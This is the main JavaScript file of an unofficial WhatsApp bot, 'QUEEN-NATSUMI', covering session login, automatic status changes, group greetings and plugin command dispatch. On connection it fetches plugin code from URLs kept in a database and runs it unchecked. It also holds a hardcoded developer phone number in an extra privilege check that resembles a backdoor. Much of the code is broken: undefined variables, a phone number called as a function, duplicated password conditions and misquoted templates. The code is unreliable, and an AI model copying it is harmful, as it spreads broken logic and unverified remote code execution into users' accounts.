/*Coded By Cyber Draxo

 ██████╗ ██╗   ██╗███████╗███████╗███╗   ██╗
██╔═══██╗██║   ██║██╔════╝██╔════╝████╗  ██║
██║   ██║██║   ██║█████╗  █████╗  ██╔██╗ ██║
██║▄▄ ██║██║   ██║██╔══╝  ██╔══╝  ██║╚██╗██║
╚██████╔╝╚██████╔╝███████╗███████╗██║ ╚████║ 

███╗   ██╗ █████╗ ████████╗███████╗██╗   ██╗███╗   ███╗██╗
████╗  ██║██╔══██╗╚══██╔══╝██╔════╝██║   ██║████╗ ████║██║
██╔██╗ ██║███████║   ██║   ███████╗██║   ██║██╔████╔██║██║
██║╚██╗██║██╔══██║   ██║   ╚════██║██║   ██║██║╚██╔╝██║██║
██║ ╚████║██║  ██║   ██║   ███████║╚██████╔╝██║ ╚═╝ ██║██║
╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝ 
 License := GPL 3.0 
 Bot Version := 5.0.5 
 Bug Fixed 
 All Errors Fixed
 Code Enscripted By Cyber Draxo 
 ❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️❣️*/

/* Copyright (C) 2021 QUEEN-NATSUMI
Licensed under the  GPL-3.0 License;
 you may not use this file except in compliance with the License.
QUEEN-NATSUMI Cyber Draxo
*/

/* Copyright (C) 2021 QUEEN-NATSUMI
Licensed under the  GPL-3.0 License;
 you may not use this file except in compliance with the License.
QUEEN-NATSUMI Cyber Draxo
*/

const fs = require("fs");
const path = require("path");
const control = require("./control");
const chalk = require('chalk');
const Build = require('./build');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('queen-natsumi-web-api');
const {Message, StringSession, Image, Video} = require('./QueenNatsumi/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./command/sql/greetings");
const axios = require('axios');
const got = require('got');
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬BUTTON BOT VAR
var BTNMSG = ''
if (Build.LANG == 'EN') BTNMSG = '🪀💃 ✰ ℚ𝕌𝔼𝔼ℕ ℕ𝔸𝕋𝕊𝕌𝕄𝕀 𝔹𝕆𝕋 ✰ 🏆!! \n\n USERNAME ${conn.user.name}! \n\n*❒ Welcome To QUEEN-NATSUMI :│🍁*\n\n\n Your Bot Working  As ${Build.WORKTYPE} ❒.\n\n*❒│QUEEN-NATSUMI WORKING Your Account*\n\n*🍁▷ Use the 🚀.NATSUMI command to get bot menu...*\n\n\n*❒ QUEEN-NATSUMI is a powerfull WhatsApp robot developed by CYBER-DRAXO.*\n\n*🚀 This is your LOG number. Avoid using the command here.\n\n'
if (Build.LANG == 'SI') BTNMSG = '🪀💃 ✰ ℚ𝕌𝔼𝔼ℕ ℕ𝔸𝕋𝕊𝕌𝕄𝕀 𝔹𝕆𝕋 ✰ 🏆!! \n\n USERNAME ${conn.user.name}! \n\n*❒ සාදරයෙන් QUEEN-NATSUMI වෙත පිලිගන්නවා :│🍁*\n\n\n ඔබේ Bot ${Build.WORKTYPE} ලෙස ක්‍රියාකරයි.\n\n*❒│QUEEN-NATSUMI ඔබගේ ගිණුමේ දැන් සක්‍රියයි*\n\n*🍁 QUEEN-NATSUMI bot සම්පූර්න මෙනුව ලබා ගැනීමට ❒.NATSUMI විධානය භාවිතා කරන්න...*\n\n\n*❒ QUEEN-NATSUMI යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි.. /n/n මෙය ඔබගේ LOG අංකයයි.මෙහි විධාන භාවිතයෙන් වළකින්න.'

var ERRBTN = ''
if (Build.LANG == 'EN') ERRBTN = '*🎯💃 𝐐𝐔𝐄𝐄𝐍 𝐍𝐀𝐓𝐒𝐔𝐌𝐈 𝐁𝐎𝐓 🪀*  WORKING AS '+Build.WORKTYPE+'!!\n\nYOUR NAME ▷${conn.user.name}! /n/n ⦁_This is your LOG number Dont Try Command here_\n▷Also You Can join Our Support group More Help.\n\n*Error:* ```' + error + '```\n\n'
if (Build.LANG == 'SI') ERRBTN = '*🏅💃 𝐐𝐔𝐄𝐄𝐍 𝐍𝐀𝐓𝐒𝐔𝐌𝐈 𝐁𝐎𝐓 🪀*  '+Build.WORKTYPE+' ලෙස ක්‍රියා කරයි!!\n\nඔබේ නම ▷${conn.user.name}! /n/n ⦁_මෙය ඔබගේ LOG අංකයයි මෙහි විධන භාවිතයෙන් වළකින්න_\n▷ඔබට යම් ගැටලුවක් ඇත්නම් අපගේ සහය සමූහට ලිවිය හැක.\n ඒ සදහා පහත support group join button එක click කරන්න\n\n*දෝෂය:* ```' + error + '```\n\n'

var BUTTHANDLE = '';
if (/\[(\W*)\]/.test(Build.HANDLERS)) {
	BUTTHANDLE = Build.HANDLERS.match(/\[(\W*)\]/)[1][0];
} else {
	BUTTHANDLE = '.';
}	

// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬STARTED SQL🍁🍁
const NatsumiDB = Build.DATABASE.define('QueenNatsumi', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./command/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./command/sql/' + plugin);
    }
});

const plugindb = require('./command/sql/plugin');
var OWN = { ff: '94761209144,0' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function Queennatsumi () {
    await Build.DATABASE.sync();
    var StrSes_Db = await NatsumiDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬STARTED WA CONNECTION🍁🍁🍁
    const conn = new WAConnection();
    conn.version = [3, 2456, 10];
    const Session = new StringSession();
    conn.browserDescription = ["QUEEN-NATSUMI", "Safari", '3.0']

    conn.logger.level = Build.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(Build.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('▷ Login information updated! 🏆️')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await NatsumiDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('💃Queen')}${chalk.blue.bold('Natsumi💃')} ${chalk.green.bold('❣️ Whatsapp ❣️')} ${chalk.green.bold('🎯 Bot 🎯')}
${chalk.white.bold('Version:')} ${chalk.red.bold(Build.VERSION)}
${chalk.blue.italic('🏆 Connecting to WhatsApp...▶')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('🎯🎯  Login successful!▶')
        );
        console.log(
            chalk.blueBright.italic('Confirming password...')
        );
        if (Build.psw == 'NatsumiDrax' || Build.psw == 'draxo') {
        // Coded By Cyber Draxo
        console.log(
            chalk.green.bold('❰✰ PASSWORD CORRECT ✰❱')
        );
         }
         else if (Build.psw == 'NatsumiDrax' || Build.psw == 'draxo') {
         console.log(
            chalk.red.bold('make sure you have typed the correct password'));
         throw new Error("Password Error ⚠⚠ ");         
         return; 
         }        

        console.log(
            chalk.blueBright.italic('🎟️️ Installing external plugins...▶')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./command/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./command/' + plugin.dataValues.name + '.js', response.body);
                    require('./command/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('⚙️️ Installing plugins...')
        );

        fs.readdirSync('./command').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./command/' + plugin);
            }
        });
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PLUGGINS SUCCESS🍁🍁🍁
        console.log(
            chalk.green.bold('❒🏅 PLUGINS INSTALLED SUCCESSFULLY !▷')
       );
        
        console.log(
            chalk.blueBright.italic('️💃 QUEEN NATSUMI WHATSAPP BOT WORKING ⚙️ ')
        );
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ START BUTTON MESSAGE

				const buttons = [
			        {buttonId: BUTTNHANDLE + 'chek', buttonText: {displayText: '🔱 VERIFY YOUR BOT 💃' }, type: 1},
			        {buttonId: BUTTNHANDLE + 'QUEENMATSUMI', buttonText: {displayText: '💃 BOT FULL CMD 💃' }, type: 1},
					{buttonId: BUTTNHANDLE + 'update', buttonText: {displayText: '🚀 BOT UPDATE 🚀' }, type: 1}
			    ]
			    const buttonMessage = {
			        image: {url: 'https://telegra.ph/file/96ea4428b3e50a7764d8f.jpg'},    
			        contentText: BTNMSG,
			        footerText: 'ǫᴜᴇᴇɴ ɴᴀᴛsᴜᴍɪ ʙᴜᴛᴛᴏɴ ʙᴏᴛ',
			        buttons: buttons,
			        headerType: 4
			    }
			  await conn.sendMessage(conn.user.jid, buttonMessage ,MessageType.buttonsMessage);  

     });
    
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END LOGIN MESSAGE🍁🍁
    setInterval(async () => { 
        if (Build.AUTOBIO == 'true') {
            if (conn.user.jid('94761209144')) { // ✰✰✰ Bot Owner ✰✰✰
                await conn.setStatus(Build.OWNER_BIO);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.OWNER_BIO2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.OWNER_BIO3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('33')) { // France
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
            else {
                await conn.setStatus(Build.B1);
   				await new Promise(r => setTimeout(r, 5000));
			    await conn.setStatus(Build.B2);  
		        await new Promise(r => setTimeout(r, 5000));
		        await conn.setStatus(Build.B3);
 		        await new Promise(r => setTimeout(r, 5000));
            }
        }
    }, 7890);
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END AUTO BIO◽◽◽◽◽    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 19 && getGMTm == 1) {
            var announce = ''
            if (Build.LANG == 'EN') announce = '📢◉◉ \n👾Announcement SYSTEM 🔘'
            if (Build.LANG == 'SI') announce = '📢◉◉ \n👾නිවේදන පද්ධතිය 🔘'
            if (Build.LANG == 'ID') announce = '📢◉◉ \n👾Announcement System 🔘'
            
            let video = 'https://youtu.be/oWDW6_Ewi1U'
            let image = 'https://telegra.ph/file/10bdbaab2d4d163e2affa.jpg'
            
            if (video.includes('http') || video.includes('https')) {
                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['1080p','720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.mp4});
                });
            } else {
                if (image.includes('http') || image.includes('https')) {
                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: announce })
                } else {
                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
                }
            }
        }
    }, 50000);
 // ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END ANNOUNCEMENT🍁🍁🍁
    conn.on('chat-update', async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (Build.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END NO ONLINE🍁🍁

        if (Build.WELCOME == 'pp' || Build.WELCOME == 'Pp' || Build.WELCOME == 'PP' || Build.WELCOME == 'pP' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    // Thanks to Lyfe
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message });  });

                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    // welcome
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                       let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
                    }
                    return;
                }
            }
            else if (Build.WELCOME == 'gif' || Build.WELCOME == 'Gif' || Build.WELCOME == 'GIF' || Build.WELCOME == 'GIf' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        var tn = await axios.get(Build.BYE_GIF, { responseType: 'arraybuffer' })
                        await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                    var tn = await axios.get(Build.WELCOME_GIF, { responseType: 'arraybuffer' })
                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                }
             }
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END WELCOME & GOODBYE
        control.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.Pnatsumi === undefined || (command.Pnatsumi !== undefined && 
                        command.Pnatsumi.test(text_msg)))) || 
                    (command.Pnatsumi !== undefined && command.Pnatsumi.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.Pnatsumi === undefined || (command.Pnatsumi !== undefined && 
                        command.Pnatsumi.test(text_msg))))) {
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END VIDEO & IMAGE
                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((Build.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Build.SUDO.includes(',') ? Build.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Build.SUDO || Build.SUDO.includes(',') ? Build.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Build.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                     
                    if ((OWN.ff == "13374486428,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
// ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ END SUDO.🍁🍁
                    if (sendMsg) {
                        if (Build.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.Pnatsumi);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            const buttns = [
			        {buttonId: BUTTHANDLE + '.joi https://chat.whatsapp.com/IvJxkySd2gd7dF6bRp7u6V', buttonText: {displayText: '📛 SUPPORT GROUP JOIN 📛' }, type: 1},
			        {buttonId: BUTTHANDLE + 'chek', buttonText: {displayText: '🔱 VERIFY YOUR BOT 💃' }, type: 1}
			    ]
			    const buttonMessag = {
			        image: {url: 'https://telegra.ph/file/96ea4428b3e50a7764d8f.jpg'},    
			        contentText: ERRBTN,
			        footerText: 'ǫᴜᴇᴇɴ ɴᴀᴛsᴜᴍɪ ʙᴜᴛᴛᴏɴ ʙᴏᴛ',
			        buttons: buttns,
			        headerType: 4
			    }
			  await conn.sendMessage(conn.user.jid, buttonMessag ,MessageType.buttonsMessage);  
                            }
                        }
                    }
                }
            }
        )
    });
 // ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬END ERRROR MESSAGER🍁🍁🍁
    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(Build.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

Queennatsumi();
